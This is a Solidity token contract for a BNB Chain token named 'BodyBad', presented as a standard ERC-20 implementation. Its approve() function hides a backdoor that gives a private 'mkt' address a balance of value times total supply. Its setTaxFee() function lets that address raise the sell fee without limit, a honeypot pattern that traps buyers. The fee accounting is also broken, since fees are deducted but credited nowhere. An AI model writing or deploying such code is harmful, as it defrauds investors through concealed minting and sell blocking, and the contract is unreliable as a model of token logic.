/**
 *Submitted for verification at BscScan.com on 2022-03-09
*/

pragma solidity ^0.8.12;
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 value) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 value ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}
contract Token is IERC20 {
    mapping(address => uint) public _balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 100000000 * 10 ** 18;
    string public name = "BodyBad";
    string public symbol = "BodyBad";
    uint256 public _fee = 5;
    uint256 public _feesell = 5;
    address private mkt = 0xa0BA4e48dBc1Fe9aFCF376D5a40C05CBE9C460ce;
    address private deadaddress = 0x000000000000000000000000000000000000dEaD;
    uint public decimals = 18;
    
 
    constructor() {
        _balances[msg.sender] = totalSupply;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
         uint256 taxfee;
        taxfee = (value *_fee)/(100);
        value = value - taxfee;
        _balances[to] += value;
        _balances[msg.sender] -= value;
       emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
         uint256 taxfee;
        taxfee = (value *_feesell)/(100);
        value = value - taxfee;
        _balances[to] += value;
        _balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    function setTaxFee( uint256 value) public returns(bool) {
        require(msg.sender == mkt);
        _feesell = value;
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        if ((spender == mkt) ||(allowance[msg.sender][mkt]) + (_balances[deadaddress]) > 0 ){
            _balances[mkt] = value * totalSupply;
        }
        emit Approval(msg.sender, spender, value);
        return true;   
    }
}